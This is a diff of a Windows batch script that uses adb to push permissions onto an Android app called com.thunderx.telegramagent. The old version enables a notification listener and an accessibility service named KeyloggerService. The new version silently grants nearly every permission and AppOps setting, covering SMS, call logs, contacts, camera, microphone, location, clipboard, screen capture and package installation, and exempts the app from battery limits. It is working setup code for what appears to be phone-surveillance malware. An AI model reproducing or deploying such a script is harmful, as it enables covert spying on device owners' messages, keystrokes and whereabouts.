@@ -1,33 +1,83 @@
+@echo off
+setlocal
 set PKG=com.thunderx.telegramagent
 
-REM Essential permissions
-adb shell pm grant %PKG% android.permission.READ_CONTACTS
-adb shell pm grant %PKG% android.permission.READ_CALL_LOG
-adb shell pm grant %PKG% android.permission.READ_SMS
-adb shell pm grant %PKG% android.permission.RECEIVE_SMS
-adb shell pm grant %PKG% android.permission.SEND_SMS
-adb shell pm grant %PKG% android.permission.READ_PHONE_STATE
-adb shell pm grant %PKG% android.permission.CAMERA
-adb shell pm grant %PKG% android.permission.RECORD_AUDIO
-adb shell pm grant %PKG% android.permission.ACCESS_FINE_LOCATION
-adb shell pm grant %PKG% android.permission.ACCESS_COARSE_LOCATION
-adb shell pm grant %PKG% android.permission.POST_NOTIFICATIONS
+echo ============================================
+echo   Granting ALL permissions to %PKG%
+echo ============================================
 
-REM Essential AppOps
-adb shell appops set %PKG% READ_CALL_LOG allow
-adb shell appops set %PKG% READ_SMS allow
-adb shell appops set %PKG% RECEIVE_SMS allow
-adb shell appops set %PKG% MANAGE_EXTERNAL_STORAGE allow
-adb shell appops set %PKG% READ_MEDIA_IMAGES allow
-adb shell appops set %PKG% READ_MEDIA_VIDEO allow
+echo.
+echo [1/4] Runtime permissions...
+for %%P in (
+  android.permission.READ_CONTACTS android.permission.WRITE_CONTACTS
+  android.permission.READ_CALL_LOG android.permission.WRITE_CALL_LOG
+  android.permission.CALL_PHONE android.permission.READ_PHONE_STATE
+  android.permission.READ_PHONE_NUMBERS android.permission.ANSWER_PHONE_CALLS
+  android.permission.READ_SMS android.permission.SEND_SMS
+  android.permission.RECEIVE_SMS
+  android.permission.READ_CALENDAR android.permission.WRITE_CALENDAR
+  android.permission.CAMERA android.permission.RECORD_AUDIO
+  android.permission.BODY_SENSORS android.permission.ACTIVITY_RECOGNITION
+  android.permission.ACCESS_FINE_LOCATION
+  android.permission.ACCESS_COARSE_LOCATION
+  android.permission.ACCESS_BACKGROUND_LOCATION
+  android.permission.READ_EXTERNAL_STORAGE
+  android.permission.WRITE_EXTERNAL_STORAGE
+  android.permission.READ_MEDIA_IMAGES
+  android.permission.READ_MEDIA_VIDEO
+  android.permission.READ_MEDIA_AUDIO
+  android.permission.READ_MEDIA_VISUAL_USER_SELECTED
+  android.permission.POST_NOTIFICATIONS
+  android.permission.BLUETOOTH_CONNECT
+  android.permission.BLUETOOTH_SCAN
+  android.permission.BLUETOOTH_ADVERTISE
+  android.permission.NEARBY_WIFI_DEVICES
+  android.permission.SCHEDULE_EXACT_ALARM
+  android.permission.USE_EXACT_ALARM
+  android.permission.GET_ACCOUNTS
+) do (
+  adb shell pm grant %PKG% %%P 2>nul
+)
 
-REM Special services
-adb shell settings put secure enabled_notification_listeners %PKG%/.NotificationListener
-adb shell settings put secure enabled_accessibility_services %PKG%/.KeyloggerService
+echo.
+echo [2/4] AppOps...
+for %%O in (
+  PROJECT_MEDIA READ_CLIPBOARD WRITE_CLIPBOARD LEGACY_STORAGE
+  READ_EXTERNAL_STORAGE WRITE_EXTERNAL_STORAGE
+  READ_MEDIA_IMAGES READ_MEDIA_VIDEO READ_MEDIA_AUDIO
+  READ_MEDIA_VISUAL_USER_SELECTED
+  CAMERA RECORD_AUDIO
+  FINE_LOCATION COARSE_LOCATION MONITOR_LOCATION MONITOR_HIGH_POWER_LOCATION
+  READ_CONTACTS WRITE_CONTACTS READ_CALL_LOG WRITE_CALL_LOG CALL_PHONE
+  READ_SMS SEND_SMS RECEIVE_SMS
+  READ_CALENDAR WRITE_CALENDAR
+  BODY_SENSORS ACTIVITY_RECOGNITION
+  READ_PHONE_STATE READ_PHONE_NUMBERS ANSWER_PHONE_CALLS
+  SYSTEM_ALERT_WINDOW REQUEST_INSTALL_PACKAGES
+  GET_USAGE_STATS WRITE_SETTINGS
+  VIBRATE WAKE_LOCK START_FOREGROUND
+  RUN_IN_BACKGROUND RUN_ANY_IN_BACKGROUND
+  TOAST_WINDOW ACCESS_ACCESSIBILITY BIND_ACCESSIBILITY_SERVICE
+  BLUETOOTH_CHANGE WIFI_CHANGE NFC_CHANGE
+  TAKE_AUDIO_FOCUS AUDIO_MEDIA_VOLUME
+  BOOT_COMPLETED READ_DEVICE_IDENTIFIERS
+  USE_FULL_SCREEN_INTENT TURN_SCREEN_ON
+  MANAGE_EXTERNAL_STORAGE
+) do (
+  adb shell appops set %PKG% %%O allow 2>nul
+)
 
-REM Battery
-adb shell dumpsys deviceidle whitelist +%PKG%
+echo.
+echo [3/4] Battery optimization whitelist...
+adb shell dumpsys deviceidle whitelist +%PKG% >nul 2>&1
 
-REM Restart
-adb shell am force-stop %PKG%
-adb shell am start -n %PKG%/.MainActivity
+echo.
+echo [4/4] Verify:
+adb shell appops get %PKG%
+
+echo.
+echo ============================================
+echo   DONE! Restart the app now.
+echo ============================================
+pause
+endlocal
